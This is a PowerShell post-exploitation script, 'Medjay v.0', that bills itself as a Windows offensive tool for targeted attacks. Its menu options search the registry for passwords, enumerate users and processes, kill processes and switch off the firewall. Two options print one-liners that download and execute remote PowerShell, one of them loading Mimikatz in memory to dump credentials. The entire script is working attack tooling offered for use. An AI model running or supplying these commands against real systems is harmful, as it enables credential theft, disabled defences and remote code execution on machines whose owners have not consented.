# Medjay v.0
# A Windows offensive tool for targeted attacks.

echo "Medjay v.0
`nA Windows offensive tool for targeted attacks.`n"

$query = Read-Host -Prompt "What would you like to do? (Enter a number):
`n`t 1. List current user and user accounts.
`n`t 2. List OS details.
`n`t 3. Search for passwords in the registry.
`n`t 4. List all running processes under current user.
`n`t 5. List all running processes under SYSTEM.
`n`t 6. Kill a process.
`n`t 7. List current network connections.
`n`t 8. Find files modified after a given date.
`n`t 9. Show firewall configuration.
`n`t 10. Turn off the firewall.
`n`t 11. Launch CVE_Compare.
`n`t 12. Show drivers.
`n`t 13. Check service permissions.
`n`t 14. Invoke Mimikatz in memory.
`n`t 15. Search for a specific file.
`n`t 16. Search certain file types for a specific keyword.
`n`t 17. Launch Hawk.
`n`t 18. Base64-encode a binary.
`n`t 19.
`n "


# Base64-encodes a binary
function Convert-BinaryToString {
 [CmdletBinding()] param (
    [string] $FilePath
 )

 try {
    $ByteArray = [System.IO.File]::ReadAllBytes($FilePath);
 }

 catch {
    throw "Failed to read file. Ensure that you have permission to the file, and that the file path is correct.";
 }

 if ($ByteArray) {
    $Base64String = [System.Convert]::ToBase64String($ByteArray);
 }

 else {
    throw '$ByteArray is $null.';
 }

 #Write-Output -InputObject $Base64String;
 $Base64String | set-content ($FilePath + ".b64");
}


# Current user
$c_user = whoami
$users = net users
if ($query -eq "1")
{
  echo "`nCurrent user: $c_user"
  $users
}


# List Operating System details
if ($query -eq "2")
{
  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
}


# Search for passwords in the registry
if ($query -eq "3")
{
  reg query HKLM /f password /t REG_SZ /s
}


# List all running processes under current user
if ($query -eq "4")
{
  echo "Tasks running under user: $c_user"
  tasklist /FI "USERNAME eq $c_user" /FI "STATUS eq running"
}


# List all processes under SYSTEM
if ($query -eq "5")
{
  echo "`nTasks running under SYSTEM: "
  tasklist /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"
  echo "`n"
}


# Kill a process
if ($query -eq "6")
{
  $process2kill = Read-Host -Prompt "Enter name of process to kill"
  Stop-Process -Name "$process2kill"
}


# List current network connections
if ($query -eq "7")
{
  netstat -a
}


# Find files modified after a given date in a given directory
if ($query -eq "8")
{
  $search_dir = Read-Host -Prompt "Folder to search in"
  $mod_date = Read-Host -Prompt "Modified since (Date format: 12/14/2017)"
  forfiles /P $search_dir /S /D +$mod_date
}


# Show firewall configuration
if ($query -eq "9")
{
  netsh firewall show state
}


# Turn off Firewall
# Applies: Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Vista
if ($query -eq "10")
{
  $kill_fw = Read-Host -Prompt "Do you want to turn off the Firewall (Yes/No)"
  if ($kill_fw -eq "Yes")
  {
    netsh advfirewall set allprofiles state off
  }
}


# Launch CVE_Compare
if ($query -eq "11")
{
  python.exe C:\Users\Ulixes\Documents\Fort_Washington\CVE_Compare\Python\CVE_Compare.py
}


# Show drivers
if ($query -eq "12")
{
  DRIVERQUERY
  echo "`n"
}


# Run AccessChk to check for service permissions
if ($query -eq "13")
{
  echo "`nRun the following command:
`nIEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Jean13/Medjay/master/Invoke-AccessChk.ps1')"
}


# Invoke Mimikatz in memory
if ($query -eq "14")
{
  echo "Run the following command:
`nIEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Jean13/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
`nYou will then be able to run Mimikatz thorugh the Command Prompt as you normally would.
(E.g., Invoke-Mimikatz -DumpCreds)`n"
}


# Search for a specific file
if ($query -eq "15")
{
  $f = Read-Host -Prompt "Enter the name of the file to search for"
  cmd.exe /c "dir /s $f"
}


# Search certain file types for a specific keyword
if ($query -eq "16")
{
  $f = Read-Host -Prompt "Enter the name of the file to search for"
  $ext = Read-Host -Prompt "Enter the file extension to search in (E.g., *.txt)"
  findstr /si $f $ext
}


# Launch Hawk
if ($query -eq "17")
{
  echo "Launching the Hawk file monitor..."
  python.exe hawk.py
}


# Base64-encode a binary
if ($query -eq "18")
{
 $b = Read-Host -Prompt "Enter the filepath to the binary"
 Convert-BinaryToString $b
}


#
if ($query -eq "19")
{

}
